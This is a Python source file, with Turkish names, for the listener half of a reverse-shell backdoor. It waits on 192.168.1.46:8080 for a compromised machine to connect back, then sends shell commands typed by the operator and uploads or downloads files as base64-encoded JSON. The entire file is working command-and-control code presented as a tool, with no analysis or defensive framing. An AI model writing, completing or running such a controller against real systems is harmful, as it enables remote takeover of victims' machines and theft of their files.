import socket
import simplejson
import base64

class SoketDinleyici:
    def __init__(self, ip, port):
        dinleyici = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dinleyici.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        dinleyici.bind((ip, port))
        dinleyici.listen(0)
        print("Dinleniyor...")
        (self.baglanti, baglanti_adresi) = dinleyici.accept()
        print("Bağlantı sağlandı: " + str(baglanti_adresi))

    def json_gonder(self, veri):
        json_veri = simplejson.dumps(veri)
        self.baglanti.send(json_veri.encode("utf-8"))

    def json_al(self):
        json_veri = ""
        while True:
            try:
                json_veri += self.baglanti.recv(1024).decode("utf-8")
                return simplejson.loads(json_veri)
            except ValueError:
                continue

    def komut_calistir(self, komut_girdisi):
        self.json_gonder(komut_girdisi)

        if komut_girdisi[0] == "cikis":
            self.baglanti.close()
            exit()

        return self.json_al()

    def dosya_kaydet(self, yol, icerik):
        with open(yol, "wb") as dosya:
            dosya.write(base64.b64decode(icerik))
        return "İndirme tamamlandı"

    def dosya_icerigi_al(self, yol):
        with open(yol, "rb") as dosya:
            return base64.b64encode(dosya.read()).decode("utf-8")

    def dinleyici_baslat(self):
        while True:
            komut_girdisi = input("Komut girin: ").split(" ")
            try:
                if komut_girdisi[0] == "yukle":
                    dosya_icerigi = self.dosya_icerigi_al(komut_girdisi[1])
                    komut_girdisi.append(dosya_icerigi)

                komut_ciktisi = self.komut_calistir(komut_girdisi)

                if komut_girdisi[0] == "indir" and "Error!" not in komut_ciktisi:
                    komut_ciktisi = self.dosya_kaydet(komut_girdisi[1], komut_ciktisi)
            except Exception as e:
                komut_ciktisi = f"Hata: {str(e)}"
            print(komut_ciktisi)

soket_dinleyici = SoketDinleyici("192.168.1.46", 8080)
soket_dinleyici.dinleyici_baslat()
